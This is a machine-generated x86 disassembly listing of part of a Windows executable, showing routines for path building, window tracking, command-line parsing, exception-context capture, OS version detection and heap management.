  4037d6:	89 45 0c             	mov    %eax,0xc(%ebp)
  4037d9:	e8 d7 00 00 00       	call   0x4038b5
  4037de:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4037e1:	74 43                	je     0x403826
  4037e3:	68 04 90 40 00       	push   $0x409004
  4037e8:	ff 75 fc             	push   -0x4(%ebp)
  4037eb:	ff d6                	call   *%esi
  4037ed:	ff 75 10             	push   0x10(%ebp)
  4037f0:	8b d8                	mov    %eax,%ebx
  4037f2:	57                   	push   %edi
  4037f3:	e8 58 3f 00 00       	call   0x407750
  4037f8:	8b f0                	mov    %eax,%esi
  4037fa:	56                   	push   %esi
  4037fb:	ff 75 0c             	push   0xc(%ebp)
  4037fe:	c6 06 00             	movb   $0x0,(%esi)
  403801:	ff d3                	call   *%ebx
  403803:	ff 75 0c             	push   0xc(%ebp)
  403806:	ff 15 74 a8 40 00    	call   *0x40a874
  40380c:	56                   	push   %esi
  40380d:	e8 e4 45 00 00       	call   0x407df6
  403812:	8b d8                	mov    %eax,%ebx
  403814:	8d 04 1e             	lea    (%esi,%ebx,1),%eax
  403817:	80 78 ff 5c          	cmpb   $0x5c,-0x1(%eax)
  40381b:	59                   	pop    %ecx
  40381c:	74 08                	je     0x403826
  40381e:	c6 00 5c             	movb   $0x5c,(%eax)
  403821:	c6 40 01 00          	movb   $0x0,0x1(%eax)
  403825:	43                   	inc    %ebx
  403826:	ff 75 fc             	push   -0x4(%ebp)
  403829:	ff 15 bc a6 40 00    	call   *0x40a6bc
  40382f:	85 db                	test   %ebx,%ebx
  403831:	5e                   	pop    %esi
  403832:	75 0c                	jne    0x403840
  403834:	ff 75 10             	push   0x10(%ebp)
  403837:	57                   	push   %edi
  403838:	e8 13 3f 00 00       	call   0x407750
  40383d:	c6 00 00             	movb   $0x0,(%eax)
  403840:	2b fb                	sub    %ebx,%edi
  403842:	57                   	push   %edi
  403843:	e8 a8 3f 00 00       	call   0x4077f0
  403848:	5f                   	pop    %edi
  403849:	5b                   	pop    %ebx
  40384a:	c9                   	leave
  40384b:	c2 0c 00             	ret    $0xc
  40384e:	53                   	push   %ebx
  40384f:	56                   	push   %esi
  403850:	57                   	push   %edi
  403851:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403855:	6a 00                	push   $0x0
  403857:	57                   	push   %edi
  403858:	ff 15 68 a7 40 00    	call   *0x40a768
  40385e:	8b 1d ec a6 40 00    	mov    0x40a6ec,%ebx
  403864:	8b f0                	mov    %eax,%esi
  403866:	ff d3                	call   *%ebx
  403868:	3b f0                	cmp    %eax,%esi
  40386a:	75 40                	jne    0x4038ac
  40386c:	57                   	push   %edi
  40386d:	ff 15 6c a7 40 00    	call   *0x40a76c
  403873:	85 c0                	test   %eax,%eax
  403875:	74 35                	je     0x4038ac
  403877:	57                   	push   %edi
  403878:	ff 15 70 a7 40 00    	call   *0x40a770
  40387e:	85 c0                	test   %eax,%eax
  403880:	74 2a                	je     0x4038ac
  403882:	ff 15 74 a7 40 00    	call   *0x40a774
  403888:	3b f8                	cmp    %eax,%edi
  40388a:	74 20                	je     0x4038ac
  40388c:	6a 00                	push   $0x0
  40388e:	57                   	push   %edi
  40388f:	ff 15 78 a7 40 00    	call   *0x40a778
  403895:	6a 10                	push   $0x10
  403897:	68 c0 b1 40 00       	push   $0x40b1c0
  40389c:	e8 39 2f 00 00       	call   0x4067da
  4038a1:	59                   	pop    %ecx
  4038a2:	8b f0                	mov    %eax,%esi
  4038a4:	59                   	pop    %ecx
  4038a5:	89 7e 04             	mov    %edi,0x4(%esi)
  4038a8:	ff d3                	call   *%ebx
  4038aa:	89 06                	mov    %eax,(%esi)
  4038ac:	5f                   	pop    %edi
  4038ad:	33 c0                	xor    %eax,%eax
  4038af:	5e                   	pop    %esi
  4038b0:	40                   	inc    %eax
  4038b1:	5b                   	pop    %ebx
  4038b2:	c2 08 00             	ret    $0x8
  4038b5:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4038ba:	74 11                	je     0x4038cd
  4038bc:	ff 74 24 04          	push   0x4(%esp)
  4038c0:	68 4e 38 40 00       	push   $0x40384e
  4038c5:	ff 15 7c a7 40 00    	call   *0x40a77c
  4038cb:	eb 3d                	jmp    0x40390a
  4038cd:	56                   	push   %esi
  4038ce:	8b 35 c0 b1 40 00    	mov    0x40b1c0,%esi
  4038d4:	85 f6                	test   %esi,%esi
  4038d6:	74 31                	je     0x403909
  4038d8:	53                   	push   %ebx
  4038d9:	57                   	push   %edi
  4038da:	8b 1e                	mov    (%esi),%ebx
  4038dc:	8d 7e 08             	lea    0x8(%esi),%edi
  4038df:	ff 15 ec a6 40 00    	call   *0x40a6ec
  4038e5:	39 07                	cmp    %eax,(%edi)
  4038e7:	75 18                	jne    0x403901
  4038e9:	6a 01                	push   $0x1
  4038eb:	ff 76 0c             	push   0xc(%esi)
  4038ee:	ff 15 78 a7 40 00    	call   *0x40a778
  4038f4:	57                   	push   %edi
  4038f5:	68 c0 b1 40 00       	push   $0x40b1c0
  4038fa:	e8 1e 2f 00 00       	call   0x40681d
  4038ff:	59                   	pop    %ecx
  403900:	59                   	pop    %ecx
  403901:	85 db                	test   %ebx,%ebx
  403903:	8b f3                	mov    %ebx,%esi
  403905:	75 d3                	jne    0x4038da
  403907:	5f                   	pop    %edi
  403908:	5b                   	pop    %ebx
  403909:	5e                   	pop    %esi
  40390a:	c2 04 00             	ret    $0x4
  40390d:	55                   	push   %ebp
  40390e:	8b ec                	mov    %esp,%ebp
  403910:	51                   	push   %ecx
  403911:	56                   	push   %esi
  403912:	ff 15 74 a7 40 00    	call   *0x40a774
  403918:	8b f0                	mov    %eax,%esi
  40391a:	85 f6                	test   %esi,%esi
  40391c:	74 18                	je     0x403936
  40391e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403921:	50                   	push   %eax
  403922:	56                   	push   %esi
  403923:	ff 15 68 a7 40 00    	call   *0x40a768
  403929:	ff 15 f0 a6 40 00    	call   *0x40a6f0
  40392f:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  403932:	74 02                	je     0x403936
  403934:	33 f6                	xor    %esi,%esi
  403936:	8b c6                	mov    %esi,%eax
  403938:	5e                   	pop    %esi
  403939:	c9                   	leave
  40393a:	c3                   	ret
  40393b:	6a 00                	push   $0x0
  40393d:	6a 00                	push   $0x0
  40393f:	6a 10                	push   $0x10
  403941:	e8 ee 2a 00 00       	call   0x406434
  403946:	68 b8 b3 40 00       	push   $0x40b3b8
  40394b:	a3 d0 b3 40 00       	mov    %eax,0x40b3d0
  403950:	ff 15 f4 a6 40 00    	call   *0x40a6f4
  403956:	c3                   	ret
  403957:	55                   	push   %ebp
  403958:	8b ec                	mov    %esp,%ebp
  40395a:	51                   	push   %ecx
  40395b:	53                   	push   %ebx
  40395c:	56                   	push   %esi
  40395d:	57                   	push   %edi
  40395e:	ff 35 d0 b3 40 00    	push   0x40b3d0
  403964:	e8 c4 2a 00 00       	call   0x40642d
  403969:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  40396d:	8b f8                	mov    %eax,%edi
  40396f:	33 f6                	xor    %esi,%esi
  403971:	ff 15 f8 a6 40 00    	call   *0x40a6f8
  403977:	8a 08                	mov    (%eax),%cl
  403979:	84 c9                	test   %cl,%cl
  40397b:	74 75                	je     0x4039f2
  40397d:	8b 55 08             	mov    0x8(%ebp),%edx
  403980:	80 f9 20             	cmp    $0x20,%cl
  403983:	75 06                	jne    0x40398b
  403985:	40                   	inc    %eax
  403986:	80 38 20             	cmpb   $0x20,(%eax)
  403989:	74 fa                	je     0x403985
  40398b:	8a 08                	mov    (%eax),%cl
  40398d:	33 db                	xor    %ebx,%ebx
  40398f:	43                   	inc    %ebx
  403990:	80 f9 22             	cmp    $0x22,%cl
  403993:	75 23                	jne    0x4039b8
  403995:	40                   	inc    %eax
  403996:	8a 08                	mov    (%eax),%cl
  403998:	84 c9                	test   %cl,%cl
  40399a:	8b f0                	mov    %eax,%esi
  40399c:	74 16                	je     0x4039b4
  40399e:	80 f9 22             	cmp    $0x22,%cl
  4039a1:	74 07                	je     0x4039aa
  4039a3:	40                   	inc    %eax
  4039a4:	8a 08                	mov    (%eax),%cl
  4039a6:	84 c9                	test   %cl,%cl
  4039a8:	75 f4                	jne    0x40399e
  4039aa:	80 38 00             	cmpb   $0x0,(%eax)
  4039ad:	74 05                	je     0x4039b4
  4039af:	8b d0                	mov    %eax,%edx
  4039b1:	40                   	inc    %eax
  4039b2:	eb 21                	jmp    0x4039d5
  4039b4:	8b d0                	mov    %eax,%edx
  4039b6:	eb 1d                	jmp    0x4039d5
  4039b8:	84 c9                	test   %cl,%cl
  4039ba:	74 17                	je     0x4039d3
  4039bc:	8b f0                	mov    %eax,%esi
  4039be:	80 f9 20             	cmp    $0x20,%cl
  4039c1:	74 07                	je     0x4039ca
  4039c3:	40                   	inc    %eax
  4039c4:	8a 08                	mov    (%eax),%cl
  4039c6:	84 c9                	test   %cl,%cl
  4039c8:	75 f4                	jne    0x4039be
  4039ca:	80 38 00             	cmpb   $0x0,(%eax)
  4039cd:	8b d0                	mov    %eax,%edx
  4039cf:	74 04                	je     0x4039d5
  4039d1:	eb de                	jmp    0x4039b1
  4039d3:	33 db                	xor    %ebx,%ebx
  4039d5:	8b 0f                	mov    (%edi),%ecx
  4039d7:	3b 4d fc             	cmp    -0x4(%ebp),%ecx
  4039da:	75 07                	jne    0x4039e3
  4039dc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4039df:	85 c9                	test   %ecx,%ecx
  4039e1:	75 1a                	jne    0x4039fd
  4039e3:	85 db                	test   %ebx,%ebx
  4039e5:	74 03                	je     0x4039ea
  4039e7:	ff 45 fc             	incl   -0x4(%ebp)
  4039ea:	8a 08                	mov    (%eax),%cl
  4039ec:	33 f6                	xor    %esi,%esi
  4039ee:	84 c9                	test   %cl,%cl
  4039f0:	75 8e                	jne    0x403980
  4039f2:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4039f6:	75 13                	jne    0x403a0b
  4039f8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4039fb:	eb 14                	jmp    0x403a11
  4039fd:	85 f6                	test   %esi,%esi
  4039ff:	74 0d                	je     0x403a0e
  403a01:	2b d6                	sub    %esi,%edx
  403a03:	89 11                	mov    %edx,(%ecx)
  403a05:	ff 07                	incl   (%edi)
  403a07:	8b c6                	mov    %esi,%eax
  403a09:	eb 06                	jmp    0x403a11
  403a0b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403a0e:	83 21 00             	andl   $0x0,(%ecx)
  403a11:	5f                   	pop    %edi
  403a12:	5e                   	pop    %esi
  403a13:	5b                   	pop    %ebx
  403a14:	c9                   	leave
  403a15:	c2 04 00             	ret    $0x4
  403a18:	55                   	push   %ebp
  403a19:	8b ec                	mov    %esp,%ebp
  403a1b:	51                   	push   %ecx
  403a1c:	ff 35 d0 b3 40 00    	push   0x40b3d0
  403a22:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403a26:	e8 02 2a 00 00       	call   0x40642d
  403a2b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403a2e:	85 c9                	test   %ecx,%ecx
  403a30:	7c 02                	jl     0x403a34
  403a32:	89 08                	mov    %ecx,(%eax)
  403a34:	53                   	push   %ebx
  403a35:	56                   	push   %esi
  403a36:	57                   	push   %edi
  403a37:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403a3a:	50                   	push   %eax
  403a3b:	e8 17 ff ff ff       	call   0x403957
  403a40:	ff 75 0c             	push   0xc(%ebp)
  403a43:	8b 75 fc             	mov    -0x4(%ebp),%esi
  403a46:	56                   	push   %esi
  403a47:	8b d8                	mov    %eax,%ebx
  403a49:	e8 02 3d 00 00       	call   0x407750
  403a4e:	56                   	push   %esi
  403a4f:	8b f8                	mov    %eax,%edi
  403a51:	53                   	push   %ebx
  403a52:	57                   	push   %edi
  403a53:	e8 8c 43 00 00       	call   0x407de4
  403a58:	83 c4 0c             	add    $0xc,%esp
  403a5b:	c6 04 37 00          	movb   $0x0,(%edi,%esi,1)
  403a5f:	5f                   	pop    %edi
  403a60:	5e                   	pop    %esi
  403a61:	5b                   	pop    %ebx
  403a62:	c9                   	leave
  403a63:	c2 08 00             	ret    $0x8
  403a66:	ff 35 d0 b3 40 00    	push   0x40b3d0
  403a6c:	e8 bc 29 00 00       	call   0x40642d
  403a71:	6a 00                	push   $0x0
  403a73:	e8 df fe ff ff       	call   0x403957
  403a78:	c3                   	ret
  403a79:	53                   	push   %ebx
  403a7a:	56                   	push   %esi
  403a7b:	57                   	push   %edi
  403a7c:	ff 74 24 10          	push   0x10(%esp)
  403a80:	bb 04 01 00 00       	mov    $0x104,%ebx
  403a85:	53                   	push   %ebx
  403a86:	e8 c5 3c 00 00       	call   0x407750
  403a8b:	53                   	push   %ebx
  403a8c:	8b f0                	mov    %eax,%esi
  403a8e:	56                   	push   %esi
  403a8f:	ff 35 fc b0 40 00    	push   0x40b0fc
  403a95:	ff 15 fc a6 40 00    	call   *0x40a6fc
  403a9b:	68 38 90 40 00       	push   $0x409038
  403aa0:	56                   	push   %esi
  403aa1:	8b f8                	mov    %eax,%edi
  403aa3:	e8 54 43 00 00       	call   0x407dfc
  403aa8:	85 c0                	test   %eax,%eax
  403aaa:	59                   	pop    %ecx
  403aab:	59                   	pop    %ecx
  403aac:	75 14                	jne    0x403ac2
  403aae:	8d 47 fc             	lea    -0x4(%edi),%eax
  403ab1:	50                   	push   %eax
  403ab2:	8d 46 04             	lea    0x4(%esi),%eax
  403ab5:	50                   	push   %eax
  403ab6:	56                   	push   %esi
  403ab7:	e8 46 43 00 00       	call   0x407e02
  403abc:	83 c4 0c             	add    $0xc,%esp
  403abf:	83 ef 04             	sub    $0x4,%edi
  403ac2:	2b df                	sub    %edi,%ebx
  403ac4:	53                   	push   %ebx
  403ac5:	e8 26 3d 00 00       	call   0x4077f0
  403aca:	c6 04 37 00          	movb   $0x0,(%edi,%esi,1)
  403ace:	5f                   	pop    %edi
  403acf:	5e                   	pop    %esi
  403ad0:	5b                   	pop    %ebx
  403ad1:	c2 04 00             	ret    $0x4
  403ad4:	a1 c4 b1 40 00       	mov    0x40b1c4,%eax
  403ad9:	85 c0                	test   %eax,%eax
  403adb:	74 0e                	je     0x403aeb
  403add:	50                   	push   %eax
  403ade:	ff 15 00 a7 40 00    	call   *0x40a700
  403ae4:	83 25 c4 b1 40 00 00 	andl   $0x0,0x40b1c4
  403aeb:	a1 c8 b1 40 00       	mov    0x40b1c8,%eax
  403af0:	85 c0                	test   %eax,%eax
  403af2:	74 16                	je     0x403b0a
  403af4:	50                   	push   %eax
  403af5:	6a 00                	push   $0x0
  403af7:	ff 35 f8 b0 40 00    	push   0x40b0f8
  403afd:	ff 15 dc a6 40 00    	call   *0x40a6dc
  403b03:	83 25 c8 b1 40 00 00 	andl   $0x0,0x40b1c8
  403b0a:	c3                   	ret
  403b0b:	e9 c4 ff ff ff       	jmp    0x403ad4
  403b10:	33 c0                	xor    %eax,%eax
  403b12:	39 44 24 04          	cmp    %eax,0x4(%esp)
  403b16:	74 0b                	je     0x403b23
  403b18:	39 44 24 08          	cmp    %eax,0x8(%esp)
  403b1c:	74 05                	je     0x403b23
  403b1e:	e9 31 3f 00 00       	jmp    0x407a54
  403b23:	c2 08 00             	ret    $0x8
  403b26:	cc                   	int3
  403b27:	cc                   	int3
  403b28:	cc                   	int3
  403b29:	cc                   	int3
  403b2a:	cc                   	int3
  403b2b:	cc                   	int3
  403b2c:	cc                   	int3
  403b2d:	cc                   	int3
  403b2e:	cc                   	int3
  403b2f:	cc                   	int3
  403b30:	8b 44 24 04          	mov    0x4(%esp),%eax
  403b34:	50                   	push   %eax
  403b35:	e8 a6 00 00 00       	call   0x403be0
  403b3a:	85 c0                	test   %eax,%eax
  403b3c:	74 24                	je     0x403b62
  403b3e:	a1 cc b1 40 00       	mov    0x40b1cc,%eax
  403b43:	85 c0                	test   %eax,%eax
  403b45:	74 02                	je     0x403b49
  403b47:	ff d0                	call   *%eax
  403b49:	6a 00                	push   $0x0
  403b4b:	c7 05 94 a3 40 00 ff 	movl   $0xffffffff,0x40a394
  403b52:	ff ff ff 
  403b55:	ff 15 04 a7 40 00    	call   *0x40a704
  403b5b:	50                   	push   %eax
  403b5c:	ff 15 08 a7 40 00    	call   *0x40a708
  403b62:	33 c0                	xor    %eax,%eax
  403b64:	c2 04 00             	ret    $0x4
  403b67:	cc                   	int3
  403b68:	cc                   	int3
  403b69:	cc                   	int3
  403b6a:	cc                   	int3
  403b6b:	cc                   	int3
  403b6c:	cc                   	int3
  403b6d:	cc                   	int3
  403b6e:	cc                   	int3
  403b6f:	cc                   	int3
  403b70:	8b 44 24 04          	mov    0x4(%esp),%eax
  403b74:	a3 cc b1 40 00       	mov    %eax,0x40b1cc
  403b79:	c7 44 24 04 30 3b 40 	movl   $0x403b30,0x4(%esp)
  403b80:	00 
  403b81:	e9 0a 00 00 00       	jmp    0x403b90
  403b86:	cc                   	int3
  403b87:	cc                   	int3
  403b88:	cc                   	int3
  403b89:	cc                   	int3
  403b8a:	cc                   	int3
  403b8b:	cc                   	int3
  403b8c:	cc                   	int3
  403b8d:	cc                   	int3
  403b8e:	cc                   	int3
  403b8f:	cc                   	int3
  403b90:	8b 44 24 04          	mov    0x4(%esp),%eax
  403b94:	85 c0                	test   %eax,%eax
  403b96:	74 22                	je     0x403bba
  403b98:	83 3d d0 b1 40 00 00 	cmpl   $0x0,0x40b1d0
  403b9f:	74 0a                	je     0x403bab
  403ba1:	89 44 24 04          	mov    %eax,0x4(%esp)
  403ba5:	ff 25 0c a7 40 00    	jmp    *0x40a70c
  403bab:	50                   	push   %eax
  403bac:	ff 15 0c a7 40 00    	call   *0x40a70c
  403bb2:	a3 d0 b1 40 00       	mov    %eax,0x40b1d0
  403bb7:	c2 04 00             	ret    $0x4
  403bba:	a1 d0 b1 40 00       	mov    0x40b1d0,%eax
  403bbf:	50                   	push   %eax
  403bc0:	ff 15 0c a7 40 00    	call   *0x40a70c
  403bc6:	c7 05 d0 b1 40 00 00 	movl   $0x0,0x40b1d0
  403bcd:	00 00 00 
  403bd0:	c2 04 00             	ret    $0x4
  403bd3:	cc                   	int3
  403bd4:	cc                   	int3
  403bd5:	cc                   	int3
  403bd6:	cc                   	int3
  403bd7:	cc                   	int3
  403bd8:	cc                   	int3
  403bd9:	cc                   	int3
  403bda:	cc                   	int3
  403bdb:	cc                   	int3
  403bdc:	cc                   	int3
  403bdd:	cc                   	int3
  403bde:	cc                   	int3
  403bdf:	cc                   	int3
  403be0:	8b 44 24 04          	mov    0x4(%esp),%eax
  403be4:	8b 08                	mov    (%eax),%ecx
  403be6:	8b 11                	mov    (%ecx),%edx
  403be8:	89 15 94 a3 40 00    	mov    %edx,0x40a394
  403bee:	8b 08                	mov    (%eax),%ecx
  403bf0:	8b 51 0c             	mov    0xc(%ecx),%edx
  403bf3:	8b 0d 00 a0 40 00    	mov    0x40a000,%ecx
  403bf9:	89 15 d4 b3 40 00    	mov    %edx,0x40b3d4
  403bff:	89 0d d8 b3 40 00    	mov    %ecx,0x40b3d8
  403c05:	8b 08                	mov    (%eax),%ecx
  403c07:	81 39 05 00 00 c0    	cmpl   $0xc0000005,(%ecx)
  403c0d:	75 11                	jne    0x403c20
  403c0f:	83 79 10 02          	cmpl   $0x2,0x10(%ecx)
  403c13:	72 0b                	jb     0x403c20
  403c15:	8b 51 18             	mov    0x18(%ecx),%edx
  403c18:	89 15 dc b3 40 00    	mov    %edx,0x40b3dc
  403c1e:	eb 0a                	jmp    0x403c2a
  403c20:	c7 05 dc b3 40 00 00 	movl   $0x0,0x40b3dc
  403c27:	00 00 00 
  403c2a:	8b 48 04             	mov    0x4(%eax),%ecx
  403c2d:	8b 91 b0 00 00 00    	mov    0xb0(%ecx),%edx
  403c33:	89 15 e0 b3 40 00    	mov    %edx,0x40b3e0
  403c39:	8b 48 04             	mov    0x4(%eax),%ecx
  403c3c:	8b 91 a4 00 00 00    	mov    0xa4(%ecx),%edx
  403c42:	89 15 e4 b3 40 00    	mov    %edx,0x40b3e4
  403c48:	8b 48 04             	mov    0x4(%eax),%ecx
  403c4b:	8b 91 ac 00 00 00    	mov    0xac(%ecx),%edx
  403c51:	89 15 e8 b3 40 00    	mov    %edx,0x40b3e8
  403c57:	8b 48 04             	mov    0x4(%eax),%ecx
  403c5a:	8b 91 a8 00 00 00    	mov    0xa8(%ecx),%edx
  403c60:	89 15 ec b3 40 00    	mov    %edx,0x40b3ec
  403c66:	8b 48 04             	mov    0x4(%eax),%ecx
  403c69:	8b 91 b4 00 00 00    	mov    0xb4(%ecx),%edx
  403c6f:	89 15 f0 b3 40 00    	mov    %edx,0x40b3f0
  403c75:	8b 48 04             	mov    0x4(%eax),%ecx
  403c78:	8b 91 a0 00 00 00    	mov    0xa0(%ecx),%edx
  403c7e:	89 15 f4 b3 40 00    	mov    %edx,0x40b3f4
  403c84:	8b 48 04             	mov    0x4(%eax),%ecx
  403c87:	8b 91 9c 00 00 00    	mov    0x9c(%ecx),%edx
  403c8d:	89 15 f8 b3 40 00    	mov    %edx,0x40b3f8
  403c93:	8b 48 04             	mov    0x4(%eax),%ecx
  403c96:	8b 91 c4 00 00 00    	mov    0xc4(%ecx),%edx
  403c9c:	89 15 fc b3 40 00    	mov    %edx,0x40b3fc
  403ca2:	8b 40 04             	mov    0x4(%eax),%eax
  403ca5:	8b 88 c0 00 00 00    	mov    0xc0(%eax),%ecx
  403cab:	89 0d 00 b4 40 00    	mov    %ecx,0x40b400
  403cb1:	b8 01 00 00 00       	mov    $0x1,%eax
  403cb6:	c2 04 00             	ret    $0x4
  403cb9:	cc                   	int3
  403cba:	cc                   	int3
  403cbb:	cc                   	int3
  403cbc:	cc                   	int3
  403cbd:	cc                   	int3
  403cbe:	cc                   	int3
  403cbf:	cc                   	int3
  403cc0:	a1 d0 b1 40 00       	mov    0x40b1d0,%eax
  403cc5:	50                   	push   %eax
  403cc6:	ff 15 0c a7 40 00    	call   *0x40a70c
  403ccc:	c7 05 d0 b1 40 00 00 	movl   $0x0,0x40b1d0
  403cd3:	00 00 00 
  403cd6:	c3                   	ret
  403cd7:	55                   	push   %ebp
  403cd8:	8d 6c 24 88          	lea    -0x78(%esp),%ebp
  403cdc:	81 ec 30 01 00 00    	sub    $0x130,%esp
  403ce2:	56                   	push   %esi
  403ce3:	8b 35 10 a7 40 00    	mov    0x40a710,%esi
  403ce9:	57                   	push   %edi
  403cea:	6a 64                	push   $0x64
  403cec:	5f                   	pop    %edi
  403ced:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  403cf0:	50                   	push   %eax
  403cf1:	c7 45 e4 94 00 00 00 	movl   $0x94,-0x1c(%ebp)
  403cf8:	ff d6                	call   *%esi
  403cfa:	85 c0                	test   %eax,%eax
  403cfc:	74 7d                	je     0x403d7b
  403cfe:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403d01:	48                   	dec    %eax
  403d02:	74 5a                	je     0x403d5e
  403d04:	48                   	dec    %eax
  403d05:	75 74                	jne    0x403d7b
  403d07:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403d0a:	83 e8 03             	sub    $0x3,%eax
  403d0d:	74 4b                	je     0x403d5a
  403d0f:	48                   	dec    %eax
  403d10:	74 44                	je     0x403d56
  403d12:	48                   	dec    %eax
  403d13:	74 27                	je     0x403d3c
  403d15:	48                   	dec    %eax
  403d16:	75 63                	jne    0x403d7b
  403d18:	6a 46                	push   $0x46
  403d1a:	5f                   	pop    %edi
  403d1b:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
  403d21:	50                   	push   %eax
  403d22:	c7 85 48 ff ff ff 9c 	movl   $0x9c,-0xb8(%ebp)
  403d29:	00 00 00 
  403d2c:	ff d6                	call   *%esi
  403d2e:	85 c0                	test   %eax,%eax
  403d30:	74 49                	je     0x403d7b
  403d32:	80 7d e2 01          	cmpb   $0x1,-0x1e(%ebp)
  403d36:	74 43                	je     0x403d7b
  403d38:	6a 4b                	push   $0x4b
  403d3a:	eb 3e                	jmp    0x403d7a
  403d3c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403d3f:	83 e8 00             	sub    $0x0,%eax
  403d42:	74 0e                	je     0x403d52
  403d44:	48                   	dec    %eax
  403d45:	74 07                	je     0x403d4e
  403d47:	48                   	dec    %eax
  403d48:	75 31                	jne    0x403d7b
  403d4a:	6a 41                	push   $0x41
  403d4c:	eb 2c                	jmp    0x403d7a
  403d4e:	6a 3c                	push   $0x3c
  403d50:	eb 28                	jmp    0x403d7a
  403d52:	6a 32                	push   $0x32
  403d54:	eb 24                	jmp    0x403d7a
  403d56:	6a 14                	push   $0x14
  403d58:	eb 20                	jmp    0x403d7a
  403d5a:	6a 05                	push   $0x5
  403d5c:	eb 1c                	jmp    0x403d7a
  403d5e:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  403d62:	74 14                	je     0x403d78
  403d64:	83 7d ec 0a          	cmpl   $0xa,-0x14(%ebp)
  403d68:	74 0a                	je     0x403d74
  403d6a:	83 7d ec 5a          	cmpl   $0x5a,-0x14(%ebp)
  403d6e:	75 0b                	jne    0x403d7b
  403d70:	6a 28                	push   $0x28
  403d72:	eb 06                	jmp    0x403d7a
  403d74:	6a 1e                	push   $0x1e
  403d76:	eb 02                	jmp    0x403d7a
  403d78:	6a 0a                	push   $0xa
  403d7a:	5f                   	pop    %edi
  403d7b:	8b c7                	mov    %edi,%eax
  403d7d:	5f                   	pop    %edi
  403d7e:	5e                   	pop    %esi
  403d7f:	83 c5 78             	add    $0x78,%ebp
  403d82:	c9                   	leave
  403d83:	c3                   	ret
  403d84:	ff 25 14 a7 40 00    	jmp    *0x40a714
  403d8a:	cc                   	int3
  403d8b:	cc                   	int3
  403d8c:	cc                   	int3
  403d8d:	cc                   	int3
  403d8e:	cc                   	int3
  403d8f:	cc                   	int3
  403d90:	6a 00                	push   $0x0
  403d92:	68 00 10 00 00       	push   $0x1000
  403d97:	6a 00                	push   $0x0
  403d99:	ff 15 b0 a6 40 00    	call   *0x40a6b0
  403d9f:	a3 04 b4 40 00       	mov    %eax,0x40b404
  403da4:	c3                   	ret
  403da5:	cc                   	int3
  403da6:	cc                   	int3
  403da7:	cc                   	int3
  403da8:	cc                   	int3
  403da9:	cc                   	int3
  403daa:	cc                   	int3
  403dab:	cc                   	int3
  403dac:	cc                   	int3
  403dad:	cc                   	int3
  403dae:	cc                   	int3
  403daf:	cc                   	int3
  403db0:	c3                   	ret
  403db1:	cc                   	int3
  403db2:	cc                   	int3
  403db3:	cc                   	int3
  403db4:	cc                   	int3
  403db5:	cc                   	int3
  403db6:	cc                   	int3
  403db7:	cc                   	int3
  403db8:	cc                   	int3
  403db9:	cc                   	int3
  403dba:	cc                   	int3
  403dbb:	cc                   	int3
  403dbc:	cc                   	int3
  403dbd:	cc                   	int3
  403dbe:	cc                   	int3
  403dbf:	cc                   	int3
  403dc0:	8b 44 24 04          	mov    0x4(%esp),%eax
  403dc4:	85 c0                	test   %eax,%eax
  403dc6:	7e 12                	jle    0x403dda
  403dc8:	50                   	push   %eax
  403dc9:	a1 04 b4 40 00       	mov    0x40b404,%eax
  403dce:	6a 08                	push   $0x8
  403dd0:	50                   	push   %eax
  403dd1:	ff 15 e0 a6 40 00    	call   *0x40a6e0
  403dd7:	c2 04 00             	ret    $0x4
  403dda:	33 c0                	xor    %eax,%eax
  403ddc:	c2 04 00             	ret    $0x4
  403ddf:	cc                   	int3
  403de0:	56                   	push   %esi
  403de1:	57                   	push   %edi
  403de2:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403de6:	85 ff                	test   %edi,%edi
  403de8:	7d 02                	jge    0x403dec
  403dea:	33 ff                	xor    %edi,%edi
  403dec:	8b 44 24 14          	mov    0x14(%esp),%eax
  403df0:	50                   	push   %eax
  403df1:	57                   	push   %edi
  403df2:	e8 59 39 00 00       	call   0x407750
  403df7:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403dfb:	85 c9                	test   %ecx,%ecx
  403dfd:	8b f0                	mov    %eax,%esi
  403dff:	74 17                	je     0x403e18
  403e01:	85 ff                	test   %edi,%edi
  403e03:	74 13                	je     0x403e18
  403e05:	8a 01                	mov    (%ecx),%al
  403e07:	84 c0                	test   %al,%al
  403e09:	74 0d                	je     0x403e18
  403e0b:	88 06                	mov    %al,(%esi)
  403e0d:	83 c6 01             	add    $0x1,%esi
  403e10:	83 c1 01             	add    $0x1,%ecx
  403e13:	83 ef 01             	sub    $0x1,%edi
  403e16:	75 ed                	jne    0x403e05
  403e18:	57                   	push   %edi
  403e19:	e8 d2 39 00 00       	call   0x4077f0
  403e1e:	5f                   	pop    %edi
  403e1f:	c6 06 00             	movb   $0x0,(%esi)
  403e22:	5e                   	pop    %esi
  403e23:	c2 0c 00             	ret    $0xc
  403e26:	cc                   	int3
  403e27:	cc                   	int3
  403e28:	cc                   	int3
  403e29:	cc                   	int3
  403e2a:	cc                   	int3
  403e2b:	cc                   	int3
  403e2c:	cc                   	int3
  403e2d:	cc                   	int3
  403e2e:	cc                   	int3
  403e2f:	cc                   	int3
  403e30:	8b 44 24 04          	mov    0x4(%esp),%eax
  403e34:	8b 0d 04 b4 40 00    	mov    0x40b404,%ecx
  403e3a:	50                   	push   %eax
  403e3b:	6a 00                	push   $0x0
  403e3d:	51                   	push   %ecx
  403e3e:	ff 15 dc a6 40 00    	call   *0x40a6dc
  403e44:	c2 04 00             	ret    $0x4
  403e47:	cc                   	int3
  403e48:	cc                   	int3
  403e49:	cc                   	int3
  403e4a:	cc                   	int3
  403e4b:	cc                   	int3
  403e4c:	cc                   	int3
